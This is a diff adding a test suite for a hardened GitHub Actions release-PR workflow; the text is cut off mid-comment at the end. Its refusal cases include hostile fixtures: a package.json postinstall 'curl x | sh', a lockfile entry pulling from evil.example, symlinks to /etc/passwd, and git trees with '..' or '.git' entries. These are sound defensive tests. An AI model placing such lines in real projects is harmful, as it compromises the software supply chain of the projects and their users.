@@ -1,0 +1,943 @@
+import { describe, expect, it } from "bun:test";
+import { spawnSync } from "node:child_process";
+import {
+    chmodSync,
+    mkdirSync,
+    mkdtempSync,
+    readFileSync,
+    rmSync,
+    symlinkSync,
+    writeFileSync,
+} from "node:fs";
+import { tmpdir } from "node:os";
+import path from "node:path";
+import { CHANNELS } from "./release-channels";
+import { ALLOWED_PATHS, channelNames, MAX_FILE_BYTES, VERSION_LINES } from "./release-pr";
+
+const root = path.resolve(import.meta.dirname, "..");
+const file = readFileSync(path.join(root, ".github/workflows/release-pr.yaml"), "utf8");
+// Comments may name what is forbidden.
+const code = file.replace(/^\s*#.*$/gm, "");
+
+interface Step {
+    name?: string;
+    id?: string;
+    uses?: string;
+    run?: string;
+    if?: string;
+    with?: Record<string, unknown>;
+    env?: Record<string, string>;
+    "continue-on-error"?: unknown;
+}
+interface Job {
+    needs?: string[];
+    environment?: string;
+    permissions?: Record<string, string>;
+    env?: Record<string, string>;
+    outputs?: Record<string, string>;
+    steps: Step[];
+    if?: string;
+}
+const wf = Bun.YAML.parse(file) as {
+    on: Record<string, { inputs?: Record<string, Record<string, unknown>> } | null>;
+    permissions: Record<string, string>;
+    concurrency: { group: string; "cancel-in-progress": boolean };
+    defaults: { run: { shell: string } };
+    env: Record<string, string>;
+    jobs: Record<string, Job>;
+};
+const { prepare, push, "open-pr": openPr } = wf.jobs as Record<string, Job>;
+const all = Object.entries(wf.jobs).flatMap(([id, job]) => job.steps.map((step) => ({ id, step })));
+const stepOf = (job: Job, text: string) => job.steps.find((s) => (s.name ?? "").includes(text))!;
+const indexOf = (job: Job, text: string) =>
+    job.steps.findIndex((s) => (s.name ?? "").includes(text));
+const runsOf = (job: Job) => job.steps.map((s) => s.run ?? "").join("\n");
+const commandsOf = (job: Job) =>
+    runsOf(job)
+        .split("\n")
+        .map((line) => line.trim())
+        .filter(Boolean);
+
+describe("release PR workflow trigger and inputs", () => {
+    it("starts only by hand", () => {
+        expect(Object.keys(wf.on)).toEqual(["workflow_dispatch"]);
+        expect(code).not.toMatch(/repository_dispatch|schedule:|pull_request:|workflow_call/);
+    });
+
+    it("takes a base version and a channel chosen from a static list equal to the registry", () => {
+        const inputs = wf.on.workflow_dispatch!.inputs!;
+        expect(Object.keys(inputs)).toEqual(["base", "channel"]);
+        expect(inputs.base).toMatchObject({ type: "string", required: true });
+        expect(inputs.channel).toMatchObject({ type: "choice", required: true, default: "stable" });
+        expect((inputs.channel!.options as string[]).toSorted()).toEqual(channelNames().toSorted());
+    });
+
+    it("runs one dispatch per base version at a time and never cancels one", () => {
+        expect(wf.concurrency).toEqual({
+            group: "release-pr-${{ inputs.base }}",
+            "cancel-in-progress": false,
+        });
+    });
+
+    it("runs from main only, before anything is checked out", () => {
+        expect(Object.keys(wf.jobs)).toEqual(["prepare", "push", "open-pr"]);
+        const guard = prepare.steps[0]!;
+        expect(guard.name).toContain("Run from main only");
+        expect(guard.run).toContain('[ "$REF" != "refs/heads/main" ]');
+        expect(guard.run).toContain("exit 1");
+        expect(prepare.env?.REF).toBe("${{ github.ref }}");
+        expect(prepare.steps.findIndex((s) => s.uses?.startsWith("actions/checkout@"))).toBe(1);
+        // The later jobs need `prepare`, so they never run when it fails.
+        expect(push.needs).toEqual(["prepare"]);
+        expect(openPr.needs?.toSorted()).toEqual(["prepare", "push"]);
+    });
+});
+
+describe("release PR workflow privilege split", () => {
+    it("holds nothing at workflow level and one scope set per job", () => {
+        expect(wf.permissions).toEqual({});
+        expect(prepare.permissions).toEqual({ contents: "read" });
+        expect(push.permissions).toEqual({ contents: "write" });
+        expect(openPr.permissions).toEqual({ "pull-requests": "write" });
+        expect(prepare.environment).toBeUndefined();
+        expect(push.environment).toBe("release-pr");
+        expect(openPr.environment).toBe("release-pr");
+    });
+
+    it("gives the code that runs dependencies no token and no write scope", () => {
+        expect(JSON.stringify(prepare.permissions)).not.toContain("write");
+        for (const { step } of all.filter((a) => a.id === "prepare")) {
+            expect(step.env?.GH_TOKEN).toBeUndefined();
+            expect(step.run ?? "").not.toMatch(/GH_TOKEN|github\.token|extraheader|\bgh \b/);
+        }
+        const setup = stepOf(prepare, "Set up the workspace");
+        expect(setup.uses).toBe("./.github/actions/setup-workspace");
+        expect(setup.with).toMatchObject({
+            cache: "false",
+            "install-dependencies": "true",
+            "cocogitto-version": "7.0.0",
+        });
+        expect(runsOf(prepare)).toContain("cog bump");
+    });
+
+    it("installs nothing and runs no repository code in the jobs that write", () => {
+        for (const job of [push, openPr]) {
+            const text = runsOf(job).replace(/^\s*allow=.*$/m, "");
+            expect(text).not.toMatch(
+                /\b(bun(?!\.lock)|bunx|npm|npx|node|yarn|pnpm|omni|cog|python|perl|ruby|make|curl|wget)\b|tooling\/|sh -c/,
+            );
+            for (const step of job.steps) {
+                if (step.uses) {
+                    expect(step.uses.split("@")[0]).toMatch(
+                        /^actions\/(checkout|download-artifact)$/,
+                    );
+                }
+            }
+        }
+        // `open-pr` does not even check out the repository.
+        expect(openPr.steps.some((s) => s.uses?.startsWith("actions/checkout@"))).toBe(false);
+        expect(push.steps.filter((s) => s.uses?.startsWith("actions/checkout@"))).toHaveLength(1);
+    });
+
+    it("runs only these git subcommands in the push job, and nothing from the artifact as code", () => {
+        const used = new Set<string>();
+        for (const m of runsOf(push).matchAll(
+            /\bgit (?:-c "[^"]*" (?:\\\s*\n\s*)?)?([a-z-]+)(?: ([a-z-]+))?/g,
+        )) {
+            used.add(m[1] === "bundle" ? `bundle ${m[2]}` : m[1]!);
+        }
+        expect([...used].toSorted()).toEqual(
+            [
+                "bundle list-heads",
+                "bundle verify",
+                "cat-file",
+                "diff",
+                "fetch",
+                "ls-remote",
+                "push",
+                "rev-list",
+                "rev-parse",
+            ].toSorted(),
+        );
+        // Nothing the artifact holds is run: it is only ever read by `git` and tested by `[[`.
+        expect(runsOf(push)).not.toMatch(/\beval\b|\bsource\b|\. "\$|`/);
+    });
+
+    it("pushes only the release branch, by an explicit refspec, and never a tag", () => {
+        // One create-only push of one explicit branch refspec, from the validated commit object.
+        const text = runsOf(push);
+        expect(text.match(/^\s*push\s/gm) ?? []).toHaveLength(1);
+        expect(text).toMatch(
+            /git -c "http\.https:\/\/github\.com\/\.extraheader=AUTHORIZATION: basic \$auth" \\\n\s+push --force-with-lease="refs\/heads\/release\/\$VERSION:" origin \\\n\s+"\$COMMIT:refs\/heads\/release\/\$VERSION"/,
+        );
+        expect(code).not.toMatch(
+            /--tags|--force(?!-with-lease)|--mirror|\+HEAD|--all|--delete|refs\/tags|git tag/,
+        );
+        // The lease is empty: it permits a create and refuses an existing branch.
+        expect(code).toContain('--force-with-lease="refs/heads/release/$VERSION:"');
+    });
+
+    it("gives the token to one step of push and two of open-pr, none elsewhere", () => {
+        const holders = all.filter(({ step }) => step.env?.GH_TOKEN !== undefined);
+        expect(holders.map(({ id, step }) => `${id}: ${step.name}`)).toEqual([
+            "push: Push the release branch only",
+            "open-pr: Open the pull request",
+        ]);
+        for (const job of Object.values(wf.jobs)) {
+            expect(job.env?.GH_TOKEN).toBeUndefined();
+        }
+        expect(wf.env?.GH_TOKEN).toBeUndefined();
+        for (const { step } of all.filter((a) => a.id === "push" && a.step.uses)) {
+            expect(step.env?.GH_TOKEN).toBeUndefined();
+        }
+        for (const { id, step } of all.filter((a) =>
+            a.step.uses?.startsWith("actions/checkout@"),
+        )) {
+            expect(step.with, id).toMatchObject({
+                "persist-credentials": false,
+                ref: "${{ github.sha }}",
+            });
+        }
+    });
+
+    it("opens the PR from the validated version and the body as a file", () => {
+        expect(openPr.env?.VERSION).toBe("${{ needs.push.outputs.version }}");
+        expect(push.outputs?.version).toBe("${{ steps.validate.outputs.version }}");
+        const commands = commandsOf(openPr).join("\n");
+        expect(commands).toContain(
+            '--title "chore(release): v$VERSION" --body-file "$RUNNER_TEMP/data/body.md"',
+        );
+        // CI is not dispatched: the pull request's own run starts in the approval-required state
+        // and the maintainer approves it in the merge box.
+        expect(commandsOf(openPr).join("\n")).not.toContain("gh workflow run");
+        for (const command of commandsOf(openPr).filter((c) => c.startsWith("gh ")))
+            expect(command).toMatch(/^gh pr create --repo "\$GITHUB_REPOSITORY" --base main/);
+    });
+
+    it("checks the commit message and the title before anything is pushed", () => {
+        const text = runsOf(prepare);
+        expect(text).toContain('cog verify "chore(release): v$VERSION"');
+        expect(text).toContain('cog verify "$(git log -1 --format=%B)"');
+        expect(text).toContain(
+            'git bundle create "$RUNNER_TEMP/data/release.bundle" "release/$VERSION" "^$GITHUB_SHA"',
+        );
+        expect(commandsOf(prepare)).toContain('cog bump --version "$VERSION" --include-packages');
+        expect(indexOf(prepare, "Check the messages")).toBeLessThan(
+            indexOf(prepare, "Bundle the bump commit"),
+        );
+    });
+});
+
+describe("release PR workflow credentials and supply chain", () => {
+    it("uses no secret and no token for a registry", () => {
+        expect(code).not.toMatch(
+            /secrets\.|id-token|packages:|NODE_AUTH_TOKEN|NPM_TOKEN|_authToken/,
+        );
+        for (const m of code.match(/\$\{\{[^}]*\btoken\b[^}]*\}\}/g) ?? [])
+            expect(m).toMatch(/github\.token/);
+    });
+
+    it("passes untrusted inputs through env only", () => {
+        for (const { id, step } of all)
+            expect(step.run ?? "", `${id}: ${step.name}`).not.toContain("${{");
+        expect(prepare.env).toMatchObject({
+            BASE: "${{ inputs.base }}",
+            CHANNEL: "${{ inputs.channel }}",
+        });
+        expect(push.env).toMatchObject({
+            BASE: "${{ inputs.base }}",
+            CHANNEL: "${{ inputs.channel }}",
+            VERSION: "${{ needs.prepare.outputs.version }}",
+        });
+        expect(stepOf(prepare, "Plan the release").run).toContain(
+            '--base "$BASE" --channel "$CHANNEL"',
+        );
+    });
+
+    it("pins every remote action by full commit SHA, and uses no other local action", () => {
+        const uses = file.split("\n").filter((line) => /^\s*(- )?uses:/.test(line));
+        expect(uses.length).toBeGreaterThan(3);
+        for (const line of uses) {
+            if (/uses: \.\//.test(line)) {
+                expect(line.trim()).toBe("uses: ./.github/actions/setup-workspace");
+                continue;
+            }
+            expect(line, line).toMatch(/uses: [\w.-]+\/[\w.-]+@[0-9a-f]{40} # v\d+(\.\d+)*$/);
+        }
+    });
+
+    it("restores no cache: the shared setup action runs with caching off", () => {
+        expect(code).not.toMatch(/actions\/cache|setup-omni|cache-from|cache-to|restore-keys/);
+        const setups = all.filter(({ step }) => step.uses === "./.github/actions/setup-workspace");
+        expect(setups).toHaveLength(1);
+        expect(setups[0]!.step.with?.cache).toBe("false");
+        for (const { step } of all) {
+            if (step.uses?.startsWith("actions/setup-node"))
+                expect(step.with?.["package-manager-cache"]).toBe(false);
+            if (step.uses?.startsWith("oven-sh/setup-bun"))
+                expect(step.with?.["no-cache"]).toBe(true);
+        }
+    });
+
+    it("gets Omni and Cocogitto from the shared setup action, which checks their digests", () => {
+        const action = Bun.YAML.parse(
+            readFileSync(path.join(root, ".github/actions/setup-workspace/action.yaml"), "utf8"),
+        ) as {
+            inputs: Record<string, { default?: string }>;
+            runs: { steps: { name?: string; uses?: string; run?: string; if?: string }[] };
+        };
+        expect(action.inputs["omni-sha256"]!.default).toMatch(/^[0-9a-f]{64}$/);
+        const setup = stepOf(prepare, "Set up the workspace");
+        expect(setup.with?.["cocogitto-version"]).toBe("7.0.0");
+        expect(setup.with?.["cocogitto-sha256"]).toMatch(/^[0-9a-f]{64}$/);
+        const install = action.runs.steps.find((s) => s.name === "Install Cocogitto")!;
+        expect(install.run).toContain("sha256sum -c -");
+        expect(install.run).toContain("COG_SHA256");
+        expect(install.if).toBe("inputs.cocogitto-version != ''");
+    });
+
+    it("runs in bash, with no conditional steps and no failures swallowed", () => {
+        expect(wf.defaults.run.shell).toBe("bash");
+        for (const job of Object.values(wf.jobs)) expect(job.if).toBeUndefined();
+        for (const { step } of all) {
+            expect(step.if, step.name).toBeUndefined();
+            expect(step["continue-on-error"], step.name).toBeUndefined();
+        }
+        expect(code).not.toMatch(/\|\| true|set \+e|continue-on-error/);
+    });
+
+    it("keeps the handed-over artifact short-lived", () => {
+        const upload = prepare.steps.find((s) => s.uses?.startsWith("actions/upload-artifact@"))!;
+        expect(upload.with).toMatchObject({ name: "release-pr-data", "retention-days": 7 });
+    });
+});
+
+// The push job cannot run repository code, so it repeats the pattern lists and the channel names
+// in shell. They are compared with the repository's.
+describe("the push job's validation agrees with tooling/release-pr.ts and the registry", () => {
+    const script = stepOf(push, "Validate the release data").run!;
+
+    it("has the same path allowlist", () => {
+        const allow = /allow='([^']+)'/.exec(script)![1]!;
+        expect(allow).toBe(ALLOWED_PATHS.map((p) => p.source.replaceAll("\\/", "/")).join("|"));
+    });
+
+    it("has the same version-line shapes, file by file", () => {
+        const arms = [...script.matchAll(/^\s+([^\s)]+(?: \| [^\s)]+)*)\) re='([^']+)' ;;$/gm)];
+        expect(arms).toHaveLength(VERSION_LINES.length);
+        const posix = (re: string) => re.replace(/\[\[:space:\]\]/g, "\\s");
+        for (const [, , re] of arms) {
+            expect(VERSION_LINES.map((rule) => rule.line.source)).toContain(posix(re!));
+        }
+    });
+
+    it("names exactly the registry's pre-release channels", () => {
+        const names = [...script.matchAll(/^\s+([a-z]+)\) ;;$/gm)].map((m) => m[1]);
+        expect(names).toEqual(
+            CHANNELS.filter((c) => c.preRelease !== null).map((c) =>
+                c.preRelease!.replace(/^-/, "").replace(/\.N$/, ""),
+            ),
+        );
+    });
+});
+
+// Run the real validation step against repositories built for the purpose.
+describe("the push job's validation, run for real", () => {
+    const script = stepOf(push, "Validate the release data").run!;
+    const git = (cwd: string, ...args: string[]) => {
+        const done = spawnSync("git", args, {
+            cwd,
+            encoding: "utf8",
+            env: {
+                PATH: process.env.PATH!,
+                GIT_AUTHOR_NAME: "t",
+                GIT_AUTHOR_EMAIL: "t@e.x",
+                GIT_COMMITTER_NAME: "t",
+                GIT_COMMITTER_EMAIL: "t@e.x",
+                HOME: tmpdir(),
+                GIT_CONFIG_GLOBAL: "/dev/null",
+            },
+        });
+        if (done.status !== 0) throw new Error(`git ${args.join(" ")}: ${done.stderr}`);
+        return done.stdout.trim();
+    };
+    const write = (dir: string, name: string, text: string) => {
+        mkdirSync(path.dirname(path.join(dir, name)), { recursive: true });
+        writeFileSync(path.join(dir, name), text);
+    };
+    const pkg = (version: string, extra = "") =>
+        `{\n    "name": "x",\n    "version": "${version}",${extra}\n    "private": true\n}\n`;
+    const program = (version: string) =>
+        `export const a = 1;\n    const p = new Command()\n        .version("${version}")\n        .name("x");\n`;
+
+    const lock = (version: string) =>
+        `{\n  "lockfileVersion": 1,\n  "workspaces": {\n    "": {\n      "name": "x",\n      "version": "${version}",\n    },\n    "apps/cli": {\n      "name": "cli",\n      "version": "${version}",\n    },\n  },\n  "packages": {},\n}\n`;
+
+    // Tree objects a normal checkout cannot make: an entry named `..` or `.git`.
+    const literalTree = (repo: string, entries: [string, string, string][]) => {
+        // Git orders tree entries bytewise, a directory as if its name ended in a slash.
+        const key = ([mode, name]: [string, string, string]) =>
+            mode.startsWith("4") ? `${name}/` : name;
+        const sorted = entries.toSorted((a, b) => (key(a) < key(b) ? -1 : key(a) > key(b) ? 1 : 0));
+        const parts = sorted.map(([mode, name, sha]) =>
+            Buffer.concat([Buffer.from(`${mode} ${name}\0`), Buffer.from(sha, "hex")]),
+        );
+        const made = spawnSync(
+            "git",
+            ["hash-object", "-t", "tree", "-w", "--literally", "--stdin"],
+            {
+                cwd: repo,
+                input: Buffer.concat(parts),
+            },
+        );
+        if (made.status !== 0) throw new Error(String(made.stderr));
+        return made.stdout.toString().trim();
+    };
+    const withEntry = (repo: string, treeish: string, name: string, tree: string) => {
+        const listed = git(repo, "ls-tree", treeish)
+            .split("\n")
+            .filter((line) => !line.endsWith(`\t${name}`))
+            .map((line) => line.replace("\t", " ").split(" "))
+            .map(
+                ([mode, , sha, ...rest]) =>
+                    [mode!.replace(/^0+/, ""), rest.join(" "), sha!] as [string, string, string],
+            );
+        return literalTree(repo, [...listed, ["40000", name, tree]]);
+    };
+    const manifestTree = (repo: string, version: string) => {
+        const made = spawnSync("git", ["hash-object", "-w", "--stdin"], {
+            cwd: repo,
+            input: pkg(version),
+            encoding: "utf8",
+        });
+        return literalTree(repo, [["100644", "package.json", made.stdout.trim()]]);
+    };
+
+    interface Setup {
+        version?: string;
+        base?: string;
+        channel?: string;
+        message?: string;
+        change?: (repo: string) => void;
+        extraCommit?: boolean;
+        emptyCommit?: boolean;
+        bundleRefs?: string[];
+        noBundle?: boolean;
+        symlinkBundle?: boolean;
+        mergeCommit?: boolean;
+        // Rewrites the one commit: extra header lines, or text after the message, or other persons.
+        commitObject?: (raw: { tree: string; parent: string; message: string }) => string;
+        // Replaces the tree of the commit (crafted entries a normal checkout cannot make).
+        craftTree?: (repo: string, base: string) => string;
+        diffShim?: boolean;
+    }
+
+    function outcome(setup: Setup = {}) {
+        const version = setup.version ?? "0.1.0-rc.1";
+        const dir = mkdtempSync(path.join(tmpdir(), "validate-"));
+        const origin = path.join(dir, "origin");
+        mkdirSync(origin);
+        git(origin, "init", "-q", "-b", "main");
+        write(origin, "first.txt", "first\n");
+        git(origin, "add", "-A");
+        git(origin, "commit", "-qm", "first");
+        write(origin, "package.json", pkg("0.0.0"));
+        write(origin, "apps/cli/package.json", pkg("0.0.0"));
+        write(origin, "apps/cli/src/program.ts", program("0.0.0"));
+        write(origin, "CHANGELOG.md", "# Changelog\n");
+        write(origin, "bun.lock", lock("0.0.0"));
+        write(origin, ".github/workflows/x.yaml", "name: x\n");
+        write(origin, "tooling/script.ts", "export {};\n");
+        git(origin, "add", "-A");
+        git(origin, "commit", "-qm", "base");
+        const base = git(origin, "rev-parse", "HEAD");
+        const work = path.join(dir, "work");
+        git(dir, "clone", "-q", origin, work);
+        const bump = path.join(dir, "bump");
+        git(dir, "clone", "-q", origin, bump);
+        git(bump, "switch", "-q", "-c", `release/${version}`);
+        if (setup.extraCommit) {
+            write(bump, "CHANGELOG.md", "# Changelog\nextra\n");
+            git(bump, "commit", "-qam", "extra");
+        }
+        if (setup.emptyCommit) {
+            git(
+                bump,
+                "commit",
+                "-q",
+                "--allow-empty",
+                "-m",
+                setup.message ?? `chore(version): v${version}`,
+            );
+        } else {
+            if (setup.change) setup.change(bump);
+            else {
+                write(bump, "package.json", pkg(version));
+                write(bump, "apps/cli/package.json", pkg(version));
+                write(bump, "apps/cli/src/program.ts", program(version));
+                write(bump, "bun.lock", lock(version));
+                write(bump, "CHANGELOG.md", "# Changelog\n## v\n- change\n");
+                write(bump, "packages/tsconfig/CHANGELOG.md", "new\n");
+            }
+            git(bump, "add", "-A");
+            git(bump, "commit", "-qm", setup.message ?? `chore(version): v${version}`);
+        }
+        if (setup.craftTree || setup.commitObject) {
+            const tree = setup.craftTree
+                ? setup.craftTree(bump, base)
+                : git(bump, "rev-parse", "HEAD^{tree}");
+            const message = setup.message ?? `chore(version): v${version}`;
+            const raw = setup.commitObject
+                ? setup.commitObject({ tree, parent: base, message })
+                : `tree ${tree}\nparent ${base}\nauthor t <t@e.x> 1700000000 +0000\ncommitter t <t@e.x> 1700000000 +0000\n\n${message}\n`;
+            const made = spawnSync(
+                "git",
+                ["hash-object", "-t", "commit", "-w", "--literally", "--stdin"],
+                {
+                    cwd: bump,
+                    input: raw,
+                    encoding: "utf8",
+                },
+            );
+            git(bump, "update-ref", `refs/heads/release/${version}`, made.stdout.trim());
+        }
+        if (setup.mergeCommit) {
+            // A merge of main and its parent: one new commit, but not directly on main.
+            const tree = git(bump, "rev-parse", "HEAD^{tree}");
+            const merge = git(
+                bump,
+                "commit-tree",
+                tree,
+                "-p",
+                base,
+                "-p",
+                `${base}~1`,
+                "-m",
+                `chore(version): v${version}`,
+            );
+            git(bump, "reset", "-q", "--hard", merge);
+        }
+        const data = path.join(dir, "tmp", "data");
+        mkdirSync(data, { recursive: true });
+        if (!setup.noBundle) {
+            const refs = setup.bundleRefs ?? [`release/${version}`];
+            for (const ref of refs) if (ref !== `release/${version}`) git(bump, "branch", ref);
+            git(bump, "bundle", "create", path.join(data, "release.bundle"), ...refs, `^${base}`);
+            if (setup.symlinkBundle) {
+                rmSync(path.join(data, "release.bundle"));
+                symlinkSync("/etc/hostname", path.join(data, "release.bundle"));
+            }
+        }
+        const out = path.join(dir, "output");
+        writeFileSync(out, "");
+        const shims = path.join(dir, "shims");
+        mkdirSync(shims);
+        if (setup.diffShim) {
+            writeFileSync(path.join(shims, "diff"), "#!/bin/sh\nexit 2\n");
+            chmodSync(path.join(shims, "diff"), 0o755);
+        }
+        const done = spawnSync("bash", ["-e", "-o", "pipefail", "-c", script], {
+            cwd: work,
+            encoding: "utf8",
+            env: {
+                PATH: `${shims}:${process.env.PATH!}`,
+                HOME: tmpdir(),
+                GIT_CONFIG_GLOBAL: "/dev/null",
+                RUNNER_TEMP: path.join(dir, "tmp"),
+                GITHUB_SHA: base,
+                GITHUB_OUTPUT: out,
+                BASE: setup.base ?? "0.1.0",
+                CHANNEL: setup.channel ?? "rc",
+                VERSION: setup.version ?? version,
+            },
+        });
+        const output = readFileSync(out, "utf8").toString();
+        rmSync(dir, { recursive: true, force: true });
+        return { code: done.status, stderr: `${done.stdout}${done.stderr}`, output };
+    }
+
+    it("accepts a bump commit that touches only versions and changelogs", () => {
+        const done = outcome();
+        if (done.code !== 0) console.log(done.stderr);
+        expect(done.code).toBe(0);
+        expect(done.output).toMatch(/^version=0\.1\.0-rc\.1\ncommit=[0-9a-f]{40}\n$/);
+    });
+
+    it("accepts the message without a trailing newline, as Cocogitto writes it", () => {
+        const done = outcome({
+            commitObject: ({ tree, parent, message }) =>
+                `tree ${tree}\nparent ${parent}\nauthor github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com> 1700000000 +0000\ncommitter github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com> 1700000000 +0000\n\n${message}`,
+        });
+        expect(done.stderr).not.toContain("::error::");
+        expect(done.code).toBe(0);
+    });
+
+    it("accepts a stable release and a counter above 9", () => {
+        expect(outcome({ version: "0.1.0", channel: "stable" }).code).toBe(0);
+        expect(outcome({ version: "0.1.0-rc.12" }).code).toBe(0);
+    });
+
+    const refused: [string, Setup, string][] = [
+        [
+            "a changed workflow",
+            { change: (r) => write(r, ".github/workflows/x.yaml", "name: evil\n") },
+            "not an allowed path",
+        ],
+        [
+            "a changed script",
+            { change: (r) => write(r, "tooling/script.ts", "evil();\n") },
+            "not an allowed path",
+        ],
+        [
+            "a new workflow",
+            { change: (r) => write(r, ".github/workflows/new.yaml", "name: y\n") },
+            "not an allowed path",
+        ],
+        [
+            "a manifest line other than the version",
+            {
+                change: (r) =>
+                    write(
+                        r,
+                        "package.json",
+                        pkg("0.1.0-rc.1", '\n    "postinstall": "curl x | sh",'),
+                    ),
+            },
+            "only the version line may change",
+        ],
+        [
+            "an extra source line",
+            {
+                change: (r) =>
+                    write(
+                        r,
+                        "apps/cli/src/program.ts",
+                        program("0.1.0-rc.1").replace('.name("x")', '.name("x").evil()'),
+                    ),
+            },
+            "only the version line may change",
+        ],
+        [
+            "a source version line with extra code",
+            {
+                change: (r) =>
+                    write(
+                        r,
+                        "apps/cli/src/program.ts",
+                        program("0.1.0-rc.1").replace(
+                            '.version("0.1.0-rc.1")',
+                            '.version("0.1.0-rc.1"); exec()',
+                        ),
+                    ),
+            },
+            "only the version line may change",
+        ],
+        [
+            "a deleted changelog",
+            { change: (r) => rmSync(path.join(r, "CHANGELOG.md")) },
+            "not an addition or a modification",
+        ],
+        [
+            "a made-executable manifest",
+            {
+                change: (r) => {
+                    write(r, "package.json", pkg("0.1.0-rc.1"));
+                    chmodSync(path.join(r, "package.json"), 0o755);
+                },
+            },
+            "not an addition or a modification",
+        ],
+        [
+            "a symlink in place of the lockfile",
+            {
+                change: (r) => {
+                    rmSync(path.join(r, "bun.lock"));
+                    symlinkSync("/etc/passwd", path.join(r, "bun.lock"));
+                },
+            },
+            "not an addition or a modification",
+        ],
+        [
+            "a manifest of a package with another line changed",
+            {
+                change: (r) =>
+                    write(
+                        r,
+                        "apps/cli/package.json",
+                        pkg("0.1.0-rc.1", '\n    "postinstall": "curl x | sh",'),
+                    ),
+            },
+            "only the version line may change",
+        ],
+        ["a merge commit instead of one commit on main", { mergeCommit: true }, "directly on main"],
+        [
+            "a bun.lock changed beyond its version lines",
+            {
+                change: (r) =>
+                    write(
+                        r,
+                        "bun.lock",
+                        lock("0.1.0-rc.1").replace(
+                            '"packages": {}',
+                            '"packages": { "evil": ["evil@1.0.0", "https://evil.example/e.tgz"] }',
+                        ),
+                    ),
+            },
+            "only the version line may change",
+        ],
+        [
+            "a replaced bun.lock",
+            { change: (r) => write(r, "bun.lock", "{}\n") },
+            "only the version line may change",
+        ],
+        [
+            "a huge changelog",
+            { change: (r) => write(r, "CHANGELOG.md", "x".repeat(2097153)) },
+            "larger than",
+        ],
+        [
+            "a manifest whose new version is not this version",
+            { change: (r) => write(r, "package.json", pkg("9.9.9")) },
+            "is not 0.1.0-rc.1",
+        ],
+        [
+            "a lockfile whose new version is not this version",
+            { change: (r) => write(r, "bun.lock", lock("9.9.9")) },
+            "is not 0.1.0-rc.1",
+        ],
+        [
+            "a source file whose new version is not this version",
+            { change: (r) => write(r, "apps/cli/src/program.ts", program("9.9.9")) },
+            "is not 0.1.0-rc.1",
+        ],
+        [
+            "a newly added manifest",
+            { change: (r) => write(r, "packages/new/package.json", pkg("0.1.0-rc.1")) },
+            "must be modified, not added",
+        ],
+        [
+            "an added symlink at an allowlisted path",
+            {
+                change: (r) => {
+                    mkdirSync(path.join(r, "packages/tsconfig"), { recursive: true });
+                    symlinkSync("/etc/passwd", path.join(r, "packages/tsconfig/CHANGELOG.md"));
+                },
+            },
+            "not an addition or a modification of a plain file",
+        ],
+        [
+            "a path with a .. component",
+            {
+                change: (r) => write(r, "package.json", pkg("0.1.0-rc.1")),
+                craftTree: (r) =>
+                    withEntry(
+                        r,
+                        "HEAD^{tree}",
+                        "packages",
+                        literalTree(r, [["40000", "..", manifestTree(r, "0.1.0-rc.1")]]),
+                    ),
+            },
+            "packages/../package.json is not an allowed path",
+        ],
+        [
+            "a path with a .git component",
+            {
+                change: (r) => write(r, "package.json", pkg("0.1.0-rc.1")),
+                craftTree: (r) =>
+                    withEntry(
+                        r,
+                        "HEAD^{tree}",
+                        "apps",
+                        withEntry(r, "HEAD^{tree}:apps", ".git", manifestTree(r, "0.1.0-rc.1")),
+                    ),
+            },
+            "apps/.git/package.json is not an allowed path",
+        ],
+        ["a failing diff", { diffShim: true }, "diff failed"],
+        [
+            "an extra commit header",
+            {
+                commitObject: ({ tree, parent, message }) =>
+                    `tree ${tree}\nparent ${parent}\nauthor t <t@e.x> 1 +0000\ncommitter t <t@e.x> 1 +0000\nencoding ISO-8859-1\n\n${message}\n`,
+            },
+            "exactly tree, parent, author and committer",
+        ],
+        [
+            "a signature header",
+            {
+                commitObject: ({ tree, parent, message }) =>
+                    `tree ${tree}\nparent ${parent}\nauthor t <t@e.x> 1 +0000\ncommitter t <t@e.x> 1 +0000\ngpgsig -----BEGIN PGP SIGNATURE-----\n x\n -----END PGP SIGNATURE-----\n\n${message}\n`,
+            },
+            "exactly tree, parent, author and committer",
+        ],
+        [
+            "text after the message",
+            {
+                commitObject: ({ tree, parent, message }) =>
+                    `tree ${tree}\nparent ${parent}\nauthor t <t@e.x> 1 +0000\ncommitter t <t@e.x> 1 +0000\n\n${message}\n\n\n`,
+            },
+            "unexpected commit message",
+        ],
+        [
+            "a malformed author",
+            {
+                commitObject: ({ tree, parent, message }) =>
+                    `tree ${tree}\nparent ${parent}\nauthor nobody\ncommitter t <t@e.x> 1 +0000\n\n${message}\n`,
+            },
+            "unexpected author header",
+        ],
+        [
+            "a malformed committer",
+            {
+                commitObject: ({ tree, parent, message }) =>
+                    `tree ${tree}\nparent ${parent}\nauthor t <t@e.x> 1 +0000\ncommitter t <t@e.x> 1 +00\n\n${message}\n`,
+            },
+            "unexpected committer header",
+        ],
+        ["an empty commit", { emptyCommit: true }, "changes nothing"],
+        ["two commits", { extraCommit: true }, "exactly one new commit"],
+        [
+            "another commit message",
+            { message: "chore(version): v9.9.9" },
+            "unexpected commit message",
+        ],
+        [
+            "a message with a body",
+            { message: "chore(version): v0.1.0-rc.1\n\nextra" },
+            "unexpected commit message",
+        ],
+        [
+            "two refs in the bundle",
+            { bundleRefs: ["release/0.1.0-rc.1", "release/other"] },
+            "must hold one ref",
+        ],
+        ["another ref name", { bundleRefs: ["release/9.9.9"] }, "holds another ref"],
+        ["no bundle", { noBundle: true }, "no bundle"],
+        ["a symlinked bundle", { symlinkBundle: true }, ""],
+        [
+            "a version that does not start with the base",
+            { base: "0.2.0" },
+            "does not start with the base",
+        ],
+        ["a base that is not X.Y.Z", { base: "0.1" }, "the base is not X.Y.Z"],
+        ["a channel other than the version's", { channel: "stable" }, "not of the chosen channel"],
+        [
+            "a stable version for the rc channel",
+            { version: "0.1.0", channel: "rc" },
+            "not of the chosen channel",
+        ],
+        [
+            "an unregistered channel",
+            { version: "0.1.0-foo.1", channel: "foo" },
+            "not a registered pre-release channel",
+        ],
+        ["a counter with a leading zero", { version: "0.1.0-rc.01" }, "must be <channel>.<N>"],
+        ["a bare channel", { version: "0.1.0-rc" }, "must be <channel>.<N>"],
+        [
+            "a version longer than 128 characters",
+            { version: `0.1.0-rc.${"1".repeat(130)}` },
+            "longer than 128",
+        ],
+    ];
+
+    it.each(refused)("refuses %s", (_what, setup, message) => {
+        const done = outcome(setup);
+        expect(done.code).not.toBe(0);
+        expect(done.stderr).toContain(message);
+        expect(done.output).toBe("");
+    });
+});
+
+// The push step, run for real against a local bare repository standing in for the remote: the
